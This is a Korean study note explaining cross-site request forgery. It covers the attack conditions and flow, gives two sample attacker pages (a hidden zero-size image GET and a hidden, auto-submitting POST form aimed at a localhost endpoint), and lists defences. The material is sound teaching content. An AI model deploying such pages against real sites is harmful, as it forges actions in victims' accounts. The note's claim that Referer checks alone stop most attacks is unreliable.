## CSRF

### CSRF(Cross Site Request Forgery)

- 사이트 간 요청 위조를 뜻한다.
- 웹 보안 취약점의 일종이며, 사용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹사이트에 요청하게 하는 공격이다. (수정, 삭제, 등록)

## CSRF 동작원리

### CSRF 공격의 위한 조건

- 사용자는 보안이 취약한 서버로부터 로그인이 되어 있는 상태여야 한다.
- 쿠키 기반의 서버 세션 정보를 획득할 수 있어야한다.
- 공격자는 서버를 공격하기 위한 요청 방법에 대해 미리 파악하고 있어야 한다.

### CSRF 공격

![image](https://github.com/kknyapple/CS-Study/assets/72698829/206a5d49-c062-40f0-aa5a-5385988e10f6)

- 사용자가 보안이 취약한 서버에 로그인한다.
- 서버에 저장된 세션 정보를 사용할 수 있는 session ID가 사용자의 브라우저 쿠키에 저장된다.
- 공격자는 사용자가 악성 스크립트 페이지를 누르도록 유도한다. (게시글 클릭 유도, 메일, 페이지 링크)
- 사용자가 악성 스크립트가 작성된 페이지 접근 시 웹 브라우저에 의해 쿠키에 저장된 session ID와 함께 서버로 요청된다.
- 서버는 쿠키에 담긴 session ID를 통해 해당 요청이 인증된 사용자로부터 온 것으로 판단하고 처리한다.

### GET 방식 공격

```html
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attacker Site</title>
</head>
<body>
<div id="wrap">
    <h1>악성 페이지 - 숨겨진 이미지 태그</h1>
    <img src="http://localhost:8081/change?name=JunhyunnyChangedByImageTag" style="width: 0px; height: 0px;"/>
</div>
</body>
</html>
```

- img 태그를 사용하거나 하이퍼링크를 걸어주는 a 태그 이용한다.

### POST 방식 공격

```html
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Attacker Site</title>
</head>
<body>
<div id="wrap">
    <h1>악성 페이지 - 3초 뒤 숨겨진 폼(form) 전송</h1>
    <form action="http://localhost:8081/change" method="POST">
        <input type="hidden" id="memberName" name="memberName" value="JunhyunnyChangedByFormSubmit"/>
    </form>
    <script>
        setTimeout(function () {
            document.forms[0].submit();
        }, 3000);
    </script>
</div>
</body>
</html>
```

- form 태그와 hidden 타입의 input 태그를 사용한다. 페이지 렌더링이 수행되자마자 폼 전송을 시도한다.

## CSRF 방어 방법

### Referer 검증
- 요청 헤더 정보에서 request의 Referrer를 확인해 도메인이 일치하는 지 검증하는 방법이다.
- 일반적으로 Referrer 검증만으로 대부분의 CSRF 공격을 방어할 수 있다.

### CAPTCHA 도입

![image](https://github.com/kknyapple/CS-Study/assets/72698829/044fbb5d-dcc1-4cf5-8e5a-0dd8de95a86b)

- 요청 시 CAPTCHA 인증 코드가 누락되었거나 올바르지 않은 경우 요청을 거부할 수 있다.

### CSRF  토큰 사용
- 사용자 세션에 임의에 값을 저장하여 모든 요청마다 해당 값을 포함하여 전송하도록 한다.
- 서버에서 요청을 받을 때마다 세션에 저장된 값과 요청으로 전송된 값이 일치하여 검증하여 방어하는 방식이다.

### 참고

- https://devscb.tistory.com/123
- https://devscb.com/post/123/
- [https://itstory.tk/entry/CSRF-공격이란-그리고-CSRF-방어-방법](https://itstory.tk/entry/CSRF-%EA%B3%B5%EA%B2%A9%EC%9D%B4%EB%9E%80-%EA%B7%B8%EB%A6%AC%EA%B3%A0-CSRF-%EB%B0%A9%EC%96%B4-%EB%B0%A9%EB%B2%95)
- https://tibetsandfox.tistory.com/11
- (코드 참고) https://junhyunny.github.io/information/security/spring-boot/spring-security/cross-site-reqeust-forgery/
